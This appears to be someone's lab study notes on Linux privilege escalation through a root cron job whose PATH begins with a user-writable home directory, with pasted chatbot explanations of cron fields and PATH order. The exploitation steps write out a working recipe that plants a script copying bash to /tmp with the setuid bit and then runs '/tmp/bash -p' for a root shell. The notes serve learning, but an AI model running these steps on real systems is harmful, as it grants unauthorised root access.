
## Detection

**Linux VM**

1. Check the cron jobs:
   ```bash
   cat /etc/crontab

crontab -e  # If user's crontab
sudo crontab -e -u root  # If root's crontab


   ```
2. Note the value of the `PATH` variable.
![[Pasted image 20240917225019.png]]


Ah, I understand now. You're asking for a numerical breakdown of each position in a cron job entry. Here's a detailed explanation for each component, providing a specific number for each field:

### Example Cron Job Format:
```bash
# Minute Hour Day_of_Month Month Day_of_Week User Command
```

### Numerical Position for Each Component:
1. **Minute (0 - 59)**: Specifies the minute of the hour the command will run. For example, `30` means the command will execute at the 30th minute of the hour.
2. **Hour (0 - 23)**: Specifies the hour of the day the command will run. For example, `4` means the command will execute at 4 AM.
3. **Day of the Month (1 - 31)**: Specifies the day of the month the command will run. An asterisk (`*`) in this field means every day of the month.
4. **Month (1 - 12)**: Specifies the month of the year the command will run. An asterisk (`*`) in this field means every month.
5. **Day of the Week (0 - 6)**: Specifies the day of the week the command will run. `0` is Sunday, `1` is Monday, up to `6` which is Saturday. An asterisk (`*`) means every day of the week.
6. **User**: Specifies the system user under which the command will run. For example, `root` means the command will execute with root privileges.
7. **Command**: The command or script that will be executed.

All * means every minute


## Exploitation

**Linux VM**

1. Create a Bash script to overwrite the `bash` binary:
   ```bash
   echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
   ```
2. Make the script executable:
   ```bash
   chmod +x /home/user/overwrite.sh
   ```
3. Wait 1 minute for the script to execute.
4. Run the new Bash binary:

![[Pasted image 20240917232430.png]]

   ```bash
   /tmp/bash -p
   ```
5. Check your user ID:
   ```bash
   id
   ```

In the scenario you've described, noting the value of the `PATH` variable is crucial because it influences how executables are found and run by the system, particularly from cron jobs. Here’s why the `PATH` variable is important and how it plays a role in the privilege escalation attempt you mentioned:

### Key Points on the PATH Variable:

- **Order of Directories**: The `PATH` variable (`/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`) lists the directories that the shell searches through when executing a command. The order of directories is significant because the shell will use the first match it finds.

- **User-Writable Directory**: In this case, `/home/user` is placed at the beginning of the `PATH`. If this directory is writable by a non-privileged user, they can place scripts or binaries in it with the same ne as system binaries, leading to potential command hijacking when a script is run by a higher-privileged process (like a cron job).